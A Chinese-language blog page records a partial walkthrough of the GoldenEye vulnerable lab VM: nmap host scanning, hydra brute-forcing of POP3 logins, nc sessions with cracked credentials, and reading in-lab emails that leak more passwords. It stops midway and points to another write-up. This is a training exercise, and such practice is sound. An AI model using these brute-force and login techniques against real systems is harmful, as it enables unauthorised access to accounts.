@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>goldeneye靶场 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>goldeneye靶场</h1>
+    <div class="meta"><span class="chip date">2024-06-21</span><span class="chip">分类·靶场</span><span class="chip">#靶场</span></div>
+    <article><h1>goldeneye靶场</h1>
+<h2>基础操作</h2>
+<p>下载，解压，vmware扫描，打开，这些就不修要我过多叙述</p>
+<p>记得将其设置程net网关</p>
+<p>打开攻击机(kali)</p>
+<pre><code>ifconfig #查看自己的ip
+</code></pre>
+<pre><code class="language-经典nmap">nmap -sP 192.168.241.0/24   # 扫描当前网段下存活主机
+nmap 192.168.241.132 扫描该主机
+</code></pre>
+<p>nmap用法</p>
+<p><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap</a></p>
+<p><a href="https://www.cnblogs.com/nmap/p/6232207.html">nmap命令-----基础用法 </a></p>
+<p><img src="https://pic.imgdb.cn/item/66703c38d9c307b7e9a7cc5b.png" alt=""></p>
+<p>扫描出来发现开放了25以及80端口，包访问80的</p>
+<p><img src="https://pic.imgdb.cn/item/66703cbad9c307b7e9a90cf8.png" alt=""></p>
+<p>按照他的试试访问/sev-home/,有一个登录框提示，所以我们要找到账号密码，回到<a href="http://192.168.241.132/">http://192.168.241.132/</a></p>
+<p>查看源码发现里面有个js文件，进去看一眼发现一段备注，里面掺杂一个html编码</p>
+<p><img src="https://pic.imgdb.cn/item/667042c9d9c307b7e9b5fa3f.png" alt=""></p>
+<p>包登录的老弟，账密是boris/InvincibleHack3r</p>
+<pre><code>hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.241.132 -s 55007 pop3
+这里面-L -P是读取文本信息，-l是直接输入账号就好，最后的pop3，如果要爆破数据库就是mysql，爆啥写啥
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/66705190d9c307b7e9d3fefc.png" alt=""></p>
+<p>应该是能爆破出两个的（他说2-5分钟我都等了快十分钟了还是只爆破出了batalya/bird）</p>
+<p>（看了视频才知道还是有另一个boris/sectet1!)</p>
+<p><img src="https://pic.imgdb.cn/item/667051ded9c307b7e9d47ef5.png" alt=""></p>
+<p>登录boris</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nc 192.168.241.132 55007
++OK GoldenEye POP3 Electronic-Mail System
+user boris
++OK
+pass sectet1!
++OK Logged in.
+</code></pre>
+<p>查看里面的东西</p>
+<pre><code>list
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+retr 1   #查看1文件
++OK 544 octets
+Return-Path: &lt;root@127.0.0.1.goldeneye&gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id D9E47454B1
+        for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I&#39;m not going to scan emails for security risks because I trust you and the other admins here.
+.
+一个管理员发给boris的看着没有什么用处
+
+retr 2#查看2文件
++OK 373 octets
+Return-Path: &lt;natalya@ubuntu&gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id C3F2B454B1
+        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+
+natalya发给boris的说我可以渗透进你的系统，正好和之前的natalya数可以渗透进你的系统一样
+正好爆出natalya的尼玛我们一会试试
+
+retr 3  #查看3文件
++OK 921 octets
+Return-Path: &lt;alec@janus.boss&gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+
+安全性问题，看这么没什么东西
+</code></pre>
+<p>登录natalya</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nc 192.168.241.132 55007
++OK GoldenEye POP3 Electronic-Mail System
+user natalya
++OK
+pass bird
++OK Logged in.
+list
++OK 2 messages:
+1 631
+2 1048
+.
+retr 1
++OK 631 octets
+Return-Path: &lt;root@ubuntu&gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id D5EDA454B1
+        for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris&#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+retr  2
++OK 1048 octets
+Return-Path: &lt;root@ubuntu&gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 17C96454B1
+        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#39;s related to security...even if it&#39;s not, just enter it in under the guise of &quot;security&quot;...it&#39;ll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn&#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you&#39;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+</code></pre>
+<p>第一封看着没什么东西，但是第二封信就很有搞头了</p>
+<p>给了账号密码</p>
+<p>给了个内部域的登录，并且提示我们要改hosts</p>
+<p>gedit /etc/hosts</p>
+<p>改了以后登录</p>
+<p><a href="http://severnaya-station.com/gnocertdir/">http://severnaya-station.com/gnocertdir/</a></p>
+<p>进入后台
+<img src="https://pic.imgdb.cn/item/667052dad9c307b7e9d7086c.png" alt=""></p>
+<p>使用natalya的账号密码登录</p>
+<p>发现一个邮件
+<img src="https://pic.imgdb.cn/item/6670552ed9c307b7e9dc2e08.png" alt="">
+查看
+<img src="https://pic.imgdb.cn/item/66705513d9c307b7e9dbf740.png" alt="">
+发现一个新的名字
+<code>doak</code></p>
+<pre><code class="language-开爆">┌──(root㉿kali)-[~]
+└─# hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.241.132 -s 55007 pop3
+</code></pre>
+<p>后面我做完了其实，但是第二天因为一些奇奇怪怪的问题电脑爆了重装了系统，前天写完忘了传丢在桌面就无了</p>
+<p><del>（fleet能不能出个记录啊）</del></p>
+<p>后面就是在doak登录，看邮件，邮件里面给了个账号密码，之后登录网站后台，印象中是有一个图片，能用exiftool
+解析出base64加密的网站后台密码，登录，看到版本号，google搜moodle漏洞，</p>
+<p>后面我就不再打一遍了<del>（问就是懒）</del>
+[goldeneye]（<a href="https://blog.csdn.net/weixin_39368364/article/details/119462349%EF%BC%89">https://blog.csdn.net/weixin_39368364/article/details/119462349）</a>
+师傅写的满详细的，后面不会照着看就行，印象中最后是永恒之蓝的洞？</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
